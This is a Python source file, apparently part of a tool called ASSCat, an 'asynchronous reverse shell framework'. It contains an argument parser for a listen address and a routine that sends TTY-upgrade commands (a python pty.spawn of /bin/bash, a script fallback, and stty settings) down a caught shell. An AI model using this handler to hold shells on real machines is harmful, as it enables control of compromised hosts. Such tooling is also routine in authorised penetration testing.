import os
from argparse import Action, Namespace, ArgumentParser
from asyncio import sleep


class AddressAction(Action):

    def __call__(self, parser, namespace, values, option_string=None):
        def _set_stuff(ns, ip, port):
            setattr(ns, 'ip_address', ip)
            setattr(ns, 'port', int(port))
            del ns.address

        if len(values) == 2:
            ip, port = values
            _set_stuff(namespace, ip, port)
        elif len(values) == 1 and values[0].isdigit():
            ip, port = '127.0.0.1', values[0]
            _set_stuff(namespace, ip, port)
        elif len(values) == 1 and not values[0].isdigit():
            if ':' in values[0]:
                ip, port = values[0].split(':')
            else:
                ip, port = '127.0.0.1', values[0]
            _set_stuff(namespace, ip, port)
        elif not values:
            _set_stuff(namespace, '127.0.0.1', 8888)


def build_arg_parser() -> Namespace:
    parser = ArgumentParser(
        description="""ASSCat - Asynchronous reverse shell framework""",
        add_help=True,
    )
    parser.add_argument(
        "--listen",
        "-l",
        dest='listen',
        action="store_true",
        default=True,
        required=False,
        help="Enable the bind protocol"
    )

    parser.add_argument(
        "--tui",
        '--app',
        dest='tui',
        action="store_true",
        default=True,
        required=False,
        help="Start interactive Terminal-UI"
    )

    parser.add_argument(
        'address',
        nargs='*',
        help='Address to listen/connect to.',
        default=None,
        action=AddressAction,
    )

    return parser.parse_args()


async def upgrade_pty(stream, binary: str = 'python', shell: str = '/bin/bash') -> None:
    """Upgrades reverse shell to fully functional TTY when run"""

    # Get host terminal size
    cols, lines = os.get_terminal_size(1)

    if binary == 'script':
        await stream.write(f'{binary} -qc {shell} /dev/null 2>&1\n'.encode())
    elif binary.startswith('python'):
        await stream.write(f'{binary} -c "import pty; pty.spawn(\'{shell}\')" 2>&1\n'.encode())

    await stream.write(
        #f'stty 5500:5:bf:8a3b:3:1c:7f:15:4:0:1:0:11:13:1a:0:12:f:17:16:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0'
        #f'stty raw -echo;'
        f'reset && export SHELL={shell};'
        f'export TERM=xterm-256color;'
        f'stty rows {lines} columns {cols};'
        f'\n'.encode()
    )
    await sleep(.01)
